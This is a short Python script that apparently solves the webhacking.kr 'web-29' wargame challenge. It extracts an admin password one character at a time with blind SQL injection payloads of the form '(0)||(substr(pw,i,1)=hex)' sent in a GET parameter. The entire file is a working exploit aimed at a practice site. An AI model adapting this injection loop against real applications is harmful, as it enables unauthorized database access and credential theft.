import requests

url = 'https://webhacking.kr/challenge/web-29/?no='
cookies = {
    'PHPSESSID' : 'your_phpsessid'
}
dictionary = 'abcdefghijklmnopqrstuvwxyz0123456789_'

password = ''
for i in range(1, 11):
    for letter in dictionary:
        payload = '(0)||(substr(pw,{},1)={})'.format(i, hex(ord(letter)))
        payload += '&id=guest&pw=guest'
        response = requests.get(url+payload, cookies=cookies)
        print(payload)

        if 'admin password :' in response.text:
            password += letter
            flag = 1
            break

print(password)
